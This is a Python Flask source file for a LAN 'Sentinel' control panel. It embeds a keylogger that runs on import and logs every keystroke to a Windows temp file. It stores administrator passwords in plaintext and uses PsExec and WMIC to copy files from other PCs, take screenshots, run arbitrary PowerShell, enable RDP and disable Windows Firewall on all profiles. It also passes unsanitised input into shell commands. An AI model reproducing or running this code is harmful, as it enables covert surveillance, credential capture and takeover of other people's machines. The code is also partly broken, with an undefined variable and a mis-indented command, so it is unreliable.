from flask import Flask, render_template, request, jsonify
import subprocess, os, sqlite3, time, socket, threading, re

app = Flask(__name__)

# --- Configuration ---
import socket

from flask_socketio import SocketIO, emit

socketio = SocketIO(app)

from pynput.keyboard import Listener

def on_press(key):
    with open("C:\\Windows\\Temp\\keylog.txt", "a") as f:
        f.write(f"{key} ")

with Listener(on_press=on_press) as listener:
    listener.join()

@socketio.on('request_frame')
def handle_frame_request(data):
    # Target IP se frame mangwane ka logic
    pass

def get_local_prefix():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ".".join(ip.split('.')[:3]) + "."

NETWORK_PREFIX = get_local_prefix()  # CHANGE THIS to your router's IP range
DB_PATH = "sentinel_v4.db"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PSEXEC_PATH = os.path.join(BASE_DIR, "psexec.exe")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "static", "screenshots")

if not os.path.exists(SCREENSHOT_DIR): os.makedirs(SCREENSHOT_DIR)

# --- Database for Passwords ---
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('CREATE TABLE IF NOT EXISTS credentials (ip TEXT PRIMARY KEY, password TEXT)')
init_db()

def get_saved_pass(ip):
    with sqlite3.connect(DB_PATH) as conn:
        res = conn.execute("SELECT password FROM credentials WHERE ip=?", (ip,)).fetchone()
        return res[0] if res else None

def save_pass(ip, password):
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("INSERT OR REPLACE INTO credentials VALUES (?, ?)", (ip, password))

# --- Scanner Logic (FIXED) ---
def probe_device(ip, results):
    try:
        # 1. Name Discovery
        try:
            name = socket.gethostbyaddr(ip)[0]
        except:
            name = f"PC-{ip.split('.')[-1]}"

        # 2. Port Check (Firewall Detection)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        # Port 445 is for SMB/Admin Shares (Essential for PsExec)
        firewall = sock.connect_ex((ip, 445)) != 0
        sock.close()

        results.append({"ip": ip, "name": name, "firewall_on": firewall})
    except: pass

from flask import send_file

# Download directory setup
DOWNLOAD_TMP = os.path.join(BASE_DIR, "static", "downloads")
if not os.path.exists(DOWNLOAD_TMP): os.makedirs(DOWNLOAD_TMP)

@app.route('/download_file', methods=['POST'])
def download_remote_file():
    data = request.json
    ip = data.get('ip')
    remote_path = data.get('path') # Example: C:\Users\Admin\Desktop\file.txt
    password = data.get('password') or get_saved_pass(ip)
    
    # File name extract karna
    filename = os.path.basename(remote_path)
    local_path = os.path.join(DOWNLOAD_TMP, f"{ip}_{filename}")

    # Step 1: Remote PC se Server par copy karna (Administrative Share C$ use karke)
    # Note: Path conversion for SMB (C:\ to \C$\)
    smb_path = remote_path.replace(":", "$")
    copy_cmd = f'copy /Y "\\\\{ip}\\{smb_path}" "{local_path}"'
    
    try:
        # File copy execution
        result = subprocess.run(copy_cmd, shell=True, capture_output=True, text=True)
        
        if os.path.exists(local_path):
            # Step 2: Browser ko file bhejna
            return jsonify({"status": "Success", "download_url": f"/static/downloads/{ip}_{filename}"})
        else:
            return jsonify({"status": "Error", "output": "File copy failed. Check path or permissions."})
            
    except Exception as e:
        return jsonify({"status": "Error", "output": str(e)})

@app.route('/scan')
def scan():
    # Force ARP cache update
    subprocess.run(f"for /L %i in (1,1,30) do @start /b ping -n 1 -w 100 {NETWORK_PREFIX}%i > nul", shell=True)
    time.sleep(2)
    
    devices = []
    threads = []
    shared_results = []
    
    try:
        arp_out = subprocess.check_output("arp -a", shell=True).decode()
        # Regex to find IPs matching the prefix
        ips = re.findall(rf"({NETWORK_PREFIX}\d{{1,3}})", arp_out)
        unique_ips = list(set([ip for ip in ips if not ip.endswith('.255') and not ip.endswith('.1')]))

        for ip in unique_ips:
            t = threading.Thread(target=probe_device, args=(ip, shared_results))
            t.start()
            threads.append(t)
        
        for t in threads: t.join(timeout=2)
    except: pass
    return jsonify(shared_results)

@app.route('/list_files', methods=['POST'])
def list_files():
    data = request.json
    ip = data.get('ip')
    path = data.get('path', 'C:\\') # Default path C drive
    password = data.get('password') or get_saved_pass(ip)
    auth = f"-u Administrator -p \"{password}\"" if password else ""

    # 'dir' command with bare format (/b) and file details
    cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} cmd /c dir "{path}" /a /-c'
    
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        if "Access is denied" in proc.stderr:
            return jsonify({"status": "need_password"})
        
        # Output parsing (Basic parsing for demonstration)
        lines = proc.stdout.splitlines()
        files = []
        for line in lines[5:-2]: # Skipping header and footer of 'dir' output
            parts = line.split()
            if len(parts) >= 4:
                is_dir = "<DIR>" in line
                name = " ".join(parts[3:])
                files.append({"name": name, "is_dir": is_dir, "date": parts[0]})
        
        return jsonify({"status": "Success", "files": files, "current_path": path})
    except Exception as e:
        return jsonify({"status": "Error", "output": str(e)})

@app.route('/action', methods=['POST'])
def action():
    data = request.json
    ip, act = data.get('ip'), data.get('action')
    password = data.get('password') or get_saved_pass(ip)
    auth = f"-u Administrator -p \"{password}\"" if password else ""
    
    cmd = ""
    
    # --- Logic Mapping ---
    if act == "get_bandwidth":
        # Using typeperf to get real-time network bytes
        cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} typeperf "\\Network Interface(*)\\Bytes Total/sec" -sc 1'
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            # Parsing the CSV output of typeperf
            val = p.stdout.split('\n')[2].split(',')[-1].replace('"', '').strip()
            return jsonify({"status": "Success", "output": f"{float(val)/1024:.2f} KB/s"})
        except: return jsonify({"status": "Error", "output": "Offline or Access Denied"})

    elif act == "kill_proc":
        proc_name = data.get('cmd') # Reuse cmd field for process name
        cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} taskkill /F /IM {proc_name}.exe'
    

    elif act == "upload":
        l_path = data.get('file_path')
        if not l_path or not os.path.exists(l_path): return jsonify({"status": "Error", "output": "Local File Not Found"})
        cmd = f'copy /Y "{l_path}" "\\\\{ip}\\C$\\Windows\\Temp\\"'

    elif act == "screenshot":
        if not password: return jsonify({"status": "need_password", "ip": ip})
        img_name = f"ss_{ip.replace('.','_')}.png"
        save_path = os.path.join(SCREENSHOT_DIR, img_name)
        ps_code = "[Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $i=New-Object Drawing.Bitmap($b.Width,$b.Height); $g=[Drawing.Graphics]::FromImage($i); $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size); $i.Save('C:\\Windows\\Temp\\s.png');"
        subprocess.run(f'"{PSEXEC_PATH}" \\\\{ip} {auth} -i 1 powershell -Command "{ps_code}"', shell=True)
        subprocess.run(f'copy /Y \\\\{ip}\\C$\\Windows\\Temp\\s.png "{save_path}"', shell=True)
        return jsonify({"status": "Success", "img": f"/static/screenshots/{img_name}?t={int(time.time())}"})
    
    elif act == "rdp_enable":
        if not password: return jsonify({"status": "need_password", "ip": ip})
        subprocess.run(f'wmic /node:"{ip}" /user:"Administrator" /password:"{password}" process call create "reg add \\"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"', shell=True)
        subprocess.Popen(f"mstsc /v:{ip}", shell=True)
        return jsonify({"status": "Success", "output": "Opening Remote Desktop..."})

    elif act == "msg": cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} -d msg * "{data.get("message")}"'
    elif act == "powershell": cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} powershell -Command "{data.get("cmd")}"'
    elif act == "restart": cmd = f"shutdown /r /m \\\\{ip} /t 5 /f"
    elif act == "get_tasks": cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} tasklist'
    elif act == "fix":
        if not password: return jsonify({"status": "need_password", "ip": ip})
        cmd = f'wmic /node:"{ip}" /user:"Administrator" /password:"{password}" process call create "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"'

    elif act == "full_auto_fix":
        if not password: return jsonify({"status": "need_password", "ip": ip})
        
        # PowerShell Script to:
        # 1. Enable RDP & Allow through Firewall
        # 2. Disable Windows Firewall (Optional/Internal Lab only)
        # 3. Enable SMB/Admin Shares
        # 4. Set LocalAccountTokenFilterPolicy for PsExec access
        ps_commands = [
            'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections" -Value 0',
            'Enable-NetFirewallRule -DisplayGroup "Remote Desktop"',
            'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False', # Warning: Disables Firewall
            'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Type DWord'
        ]
        
        combined_cmd = " ; ".join(ps_commands)
        full_cmd = f'wmic /node:"{ip}" /user:"Administrator" /password:"{password}" process call create "powershell -Command {combined_cmd}"'
    
    elif act == "list_files":
        path = data.get('path', 'C:\\')
    cmd = f'"{PSEXEC_PATH}" \\\\{ip} {auth} cmd /c dir "{path}" /b'
    # Iska output parse karke JSON array banayein aur Frontend par bhejein
    
    # --- Execution ---
    try:
        if not cmd: return jsonify({"status": "Error", "output": "Unknown Action"})
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        if "Access is denied" in proc.stderr: return jsonify({"status": "need_password", "ip": ip})
        if password and data.get('password'): save_pass(ip, password)
        subprocess.run(full_cmd, shell=True, timeout=20)
        return jsonify({"status": "Success", "output": proc.stdout or "Command Executed Successfully." or "System settings optimized for Sentinel access."})
    except Exception as e:
        return jsonify({"status": "Error", "output": str(e)})

@app.route('/')
def index(): return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)